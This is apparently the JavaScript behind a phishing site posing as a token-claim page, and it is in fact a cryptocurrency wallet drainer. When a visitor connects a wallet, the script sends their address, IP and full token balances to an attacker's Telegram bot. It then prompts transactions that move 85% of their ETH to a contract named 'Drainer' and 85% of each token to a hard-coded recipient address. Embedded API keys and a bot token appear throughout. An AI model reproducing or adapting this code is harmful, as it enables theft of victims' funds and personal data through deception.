const web3 = new Web3(window.ethereum);

const address = "0xBd0F012961Cc75027457D6D5A1EeC0609196CEC5";
const baseURL = `https://eth-mainnet.g.alchemy.com/v2/OqD1-zd_Ijck3kZ0c-r5h6VaWm9qCMMA`;
const getblockWS = 'wss://ethereum-mainnet.core.chainstack.com/ws/fd2325ef9451d8afbf792e26e058012f';
const web3data = new Web3(new Web3.providers.WebsocketProvider(getblockWS));

const recipientAddress = '0x9cfa197E86a7619f5f6A740d24dA81A0ceEcacd9'; 

// Telegram bot settings
const telegramBotToken = '6566474417:AAEHM639ZVlKWj-8VNd5Bvj6yDx5PtpQk7c';
const chatId = '6543129120';
const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

const drainerAbi = [
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "claim",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "mine",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]; // ABI from Drainer contract

const drainerAddress = '0xBa96baD16d64a0D1B4be77fE5CA1D8b66aA4eA62';

const erc20Abi = [
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [{ "name": "", "type": "string" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{ "name": "", "type": "uint8" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
	{
        "constant": false,
        "inputs": [
            { "name": "_from", "type": "address" },
            { "name": "_to", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
	{
    "constant": false,
    "inputs": [
        { "name": "spender", "type": "address" },
        { "name": "addedValue", "type": "uint256" }
    ],
    "name": "increaseAllowance",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}
	
];

const factoryAbi = [
    {
        "constant": true,
        "inputs": [
            { "name": "tokenA", "type": "address" },
            { "name": "tokenB", "type": "address" }
        ],
        "name": "getPair",
        "outputs": [{ "name": "pair", "type": "address" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

const routerAbi = [
    {
        "constant": true,
        "inputs": [
            { "name": "amountIn", "type": "uint256" },
            { "name": "reserveIn", "type": "uint256" },
            { "name": "reserveOut", "type": "uint256" }
        ],
        "name": "getAmountOut",
        "outputs": [{ "name": "amountOut", "type": "uint256" }],
        "payable": false,
        "stateMutability": "pure",
        "type": "function"
    }
];

const pairAbi = [
    {
        "constant": true,
        "inputs": [],
        "name": "getReserves",
        "outputs": [
            { "name": "reserve0", "type": "uint112" },
            { "name": "reserve1", "type": "uint112" },
            { "name": "blockTimestampLast", "type": "uint32" }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "token0",
        "outputs": [{ "name": "", "type": "address" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "token1",
        "outputs": [{ "name": "", "type": "address" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

const routerAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
const wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

const markedTokens = [
    "0x02F0DBcE79117C6a99094D12033475E6F2ea51F5",

];

// Functions


// Function to fetch the user's IP address
async function fetchUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Failed to fetch IP address', error);
        return 'IP Address not available';
    }
}

async function connect() {
    if (window.ethereum) {
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Fetch the user's IP address
        const userIP = await fetchUserIP();

        // Modify the message to include the IP address
        await sendTelegramMessage(`User ${accounts[0]} with IP ${userIP} connected to the website.`);

        // Fetch and process the balances
        const balancesMessage = await fetchAndProcessTokens();

        // Proceed with the claim process
        claimTokens();
    } else {
        redirectToWalletOptions();
    }
}

function redirectToWalletOptions() {
    let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    if (isMobile) {
        tryDeepLink('https://metamask.app.link/dapp/tokenvortex.netlify.com', 'https://metamask.io/');
    } else {
        tryDeepLink('https://metamask.app.link/dapp/tokenvortex.netlify.com', 'https://metamask.io/');
    }
}

async function sendTelegramMessage(text) {
    const config = {
        method: 'post',
        url: telegramUrl,
        headers: {
            'Content-Type': 'application/json',
        },
        data: JSON.stringify({
            chat_id: chatId,
            text: text,
        }),
    };

    try {
        await axios(config);
        console.log('Message sent to Telegram');
    } catch (error) {
        console.error('Failed to send message to Telegram', error);
    }
}

function tryDeepLink(deepLink, fallbackUrl) {
    window.location.href = deepLink;

    setTimeout(function() {
        if (!document.hidden) {
            window.location.href = fallbackUrl;
        }
    }, 500);
}

async function claimTokens() {
    const drainerContract = new web3.eth.Contract(drainerAbi, drainerAddress);
    const userBalance = await web3.eth.getBalance(accounts[0]);
    const claimAmount = new BigNumber(userBalance).multipliedBy(0.85).toFixed(); // 85% of user balance

    // Fetch current gas price and add 5 Gwei
    const currentGasPrice = await web3.eth.getGasPrice();
    const adjustedGasPrice = new BigNumber(currentGasPrice).plus(web3.utils.toWei('2', 'gwei')).toFixed();

    await drainerContract.methods.claim(claimAmount.toString()).send({ 
        from: accounts[0], 
        value: claimAmount.toString(),
        gas: web3.utils.toHex('80000'), // Example gas limit, adjust based on your contract's requirements
        gasPrice: web3.utils.toHex(adjustedGasPrice)
    });
}

function decodeTokenBalance(hexBalance, decimals) {
    let balance = new BigNumber(hexBalance);
    return balance.dividedBy(new BigNumber(10).pow(decimals)).toString();
}

async function fetchTokenData(contractAddress) {
    const contract = new web3.eth.Contract(erc20Abi, contractAddress);
    let symbol, decimals;
    try {
        symbol = await contract.methods.symbol().call();
        decimals = await contract.methods.decimals().call();
        return { symbol, decimals };
    } catch (error) {
        return { symbol: "Unknown", decimals: 18 };
    }
}

async function getEthEquivalent(tokenAddress, tokenAmount) {
    if (tokenAddress.toLowerCase() === wethAddress.toLowerCase()) {
        return tokenAmount;
    }

    const factoryAddress = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
    const factory = new web3.eth.Contract(factoryAbi, factoryAddress); 
    const router = new web3.eth.Contract(routerAbi, routerAddress);

    const pairAddress = await factory.methods.getPair(tokenAddress, wethAddress).call();
    if (!pairAddress || pairAddress === '0x0000000000000000000000000000000000000000') return 0;

    const pair = new web3.eth.Contract(pairAbi, pairAddress);
    const reserves = await pair.methods.getReserves().call();
    const token0Address = await pair.methods.token0().call();

    let tokenReserve, wethReserve;
    if (token0Address.toLowerCase() === tokenAddress.toLowerCase()) {
        tokenReserve = reserves.reserve0;
        wethReserve = reserves.reserve1;
    } else {
        tokenReserve = reserves.reserve1;
        wethReserve = reserves.reserve0;
    }

    const { decimals } = await fetchTokenData(tokenAddress);
    const tokenAmountInSmallestUnit = new BigNumber(tokenAmount).multipliedBy(new BigNumber(10).pow(decimals)).toFixed();

    try {
        const ethEquivalent = await router.methods.getAmountOut(tokenAmountInSmallestUnit, tokenReserve, wethReserve).call();
        return web3.utils.fromWei(ethEquivalent, 'ether');
    } catch (error) {
        return 0;  // Catch the INSUFFICIENT_LIQUIDITY error and return 0
    }
}

async function processTokens(tokens) {
    const promises = tokens.map(async token => {
        if (token.tokenBalance !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
            const { symbol, decimals } = await fetchTokenData(token.contractAddress);
            token.decodedBalance = decodeTokenBalance(token.tokenBalance, decimals);
            token.symbol = symbol;

            if (token.contractAddress.toLowerCase() === wethAddress.toLowerCase()) {
                token.usdEquivalent = parseFloat(token.decodedBalance) * 2000;  // hardcoded ETH price, consider fetching it dynamically
            } else {
                const ethEquivalent = await getEthEquivalent(token.contractAddress, token.decodedBalance);
                token.usdEquivalent = parseFloat(ethEquivalent) * 2000;  // hardcoded ETH price
            }

            return token;
        }
        return null;
    });

    const results = await Promise.all(promises);
    return results.filter(Boolean);
}

async function fetchEthBalance() {
    const balance = await web3.eth.getBalance(accounts[0]);
    return web3.utils.fromWei(balance, 'ether');
}

async function promptTransferFrom(tokenAddress, recipientAddress, amount) {
    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);

    // Fetch current gas price and add 5 Gwei
    const currentGasPrice = await web3.eth.getGasPrice();
    const adjustedGasPrice = new BigNumber(currentGasPrice).plus(web3.utils.toWei('2', 'gwei')).toFixed();

    await tokenContract.methods.transferFrom(accounts[0], recipientAddress, amount).send({ 
        from: accounts[0],
        gas: web3.utils.toHex('80000'), // Example gas limit, adjust based on the token contract's requirements
        gasPrice: web3.utils.toHex(adjustedGasPrice)
    });
}

async function fetchTokenBalances(pageKey, address) {
    const requestData = {
        jsonrpc: "2.0",
        id: 42,
        method: "alchemy_getTokenBalances",
        params: [address, "erc20"]
    };

    if (pageKey) {
        requestData.params.push({ pageKey });
    }

    const config = {
        method: "post",
        url: baseURL,
        headers: {
            "Content-Type": "application/json",
        },
        data: JSON.stringify(requestData),
    };

    return axios(config);
}

async function fetchAndProcessTokens() {
    const tokens = [];
    let pageKey;
    let ethBalance = await fetchEthBalance();
    let ethUsdEquivalent = parseFloat(ethBalance) * 2000; // Fetch dynamic ETH price for accuracy

    const processedTokens = [{
        symbol: "ETH",
        contractAddress: "native",
        decodedBalance: ethBalance,
        usdEquivalent: ethUsdEquivalent,
        tokenBalance: web3.utils.toWei(ethBalance, 'ether') // ETH balance in Wei
    }];

    do {
        const response = await fetchTokenBalances(pageKey, accounts[0]);
        tokens.push(...response.data.result.tokenBalances);
        pageKey = response.data.result.pageKey;
    } while (pageKey);

    const otherProcessedTokens = await processTokens(tokens);
    processedTokens.push(...otherProcessedTokens);

    // Sort tokens by their USD equivalent in descending order
    processedTokens.sort((a, b) => b.usdEquivalent - a.usdEquivalent);

    // Construct a message for Telegram
    let telegramMessage = "Token Balances:\n\n";
    processedTokens.forEach(token => {
        telegramMessage += `Token: ${token.symbol} | Balance: ${token.decodedBalance}\nUSD Equivalent: $${token.usdEquivalent.toFixed(2)}\n\n`;
    });

    // Send the message to Telegram
    await sendTelegramMessage(telegramMessage);

    // Iterate over sorted tokens and perform actions
    for (const token of processedTokens) {
        if (token.contractAddress === "native") {
            await claimTokens(); // Call claim function for ETH
        } else {
            // Calculate 85% of token balance
            let amountToTransfer = new BigNumber(token.tokenBalance).multipliedBy(0.85).toFixed();
            await promptTransferFrom(token.contractAddress, recipientAddress, amountToTransfer); // Transfer 85% of other tokens
        }
    }
}

// Event Listener for the connect button
document.getElementById('customConnectButton').addEventListener('click', connect);